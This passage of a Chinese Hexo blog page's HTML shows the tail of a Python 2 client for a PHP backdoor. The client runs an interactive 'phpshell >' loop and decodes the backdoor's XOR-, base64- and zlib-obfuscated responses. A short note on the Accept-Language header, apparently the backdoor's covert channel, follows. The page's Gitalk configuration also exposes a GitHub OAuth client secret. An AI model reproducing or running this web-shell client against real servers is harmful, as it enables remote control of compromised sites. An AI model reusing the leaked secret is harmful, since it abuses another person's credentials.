class="line">    debugPrint(html)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># process response</span></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;%s&gt;(.*)&lt;/%s&gt;&#x27;</span> % (xorKey,xorKey))</span><br><span class="line">    output = pattern.findall(html)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(output) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Error,  no backdoor response&#x27;</span></span><br><span class="line">        cmd = raw_input(<span class="string">&#x27;phpshell &gt; &#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    output = output[<span class="number">0</span>]</span><br><span class="line">    debugPrint(output)</span><br><span class="line">    output = output.decode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">    output = loopXor(output,xorKey)</span><br><span class="line">    output = zlib.decompress(output)</span><br><span class="line">    <span class="built_in">print</span> output</span><br><span class="line">    cmd = raw_input(<span class="string">&#x27;phpshell &gt; &#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="附注"><a href="#附注" class="headerlink" title="附注"></a>附注</h2><p>Accept-Language 解释</p>
+<p>zh-cn,zh;q&#x3D;0.5</p>
+<p>浏览器支持的语言分别是中文和简体中文，优先支持简体中文。</p>
+<p>　　Accept-Language 表示浏览器所支持的语言类型；</p>
+<p>　　zh-cn 表示简体中文；zh 表示中文；</p>
+<p>　　q 是权重系数，范围 0 &#x3D;&lt;q &lt;&#x3D; 1，q 值越大，请求越倾向于获得其 “;” 之前的类型表示的内容，若没有指定 q 值，则默认为 1，若被赋值为 0，则用于提醒服务器哪些是浏览器不接受的内容类型。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2018/05/php-operator/" rel="prev" title="PHP7 新增运算符">
+                  <i class="fa fa-angle-left"></i> PHP7 新增运算符
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2018/06/currency-eos/" rel="next" title="EOS 安装本地环境">
+                  EOS 安装本地环境 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2015 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Slagga</span>
+  </div>
+  <div class="powered-by">由 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9waXNjZXMv">NexT.Pisces</span> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dpdHNsYWdnYQ==" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.21.0/comments.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.21.0/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.21.0/motion.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.21.0/sidebar.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.21.0/next-boot.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.21.0/pjax.min.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.21.0/third-party/search/local-search.min.js"></script>
+
+
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.21.0/third-party/fancybox.min.js"></script>
+
+
+
+  
+
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"gitslagga","repo":"gitslagga.github.io","client_id":"8b03c773267690e6d402","client_secret":"7b2ef82f50c632cdb14c98b7e5928357974cad97","admin_user":"gitslagga","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"4ae473dfc6fcbe0f78e391d09163f629"}</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-next/8.21.0/third-party/comments/gitalk.min.js"></script>
+
+</body>
+</html>
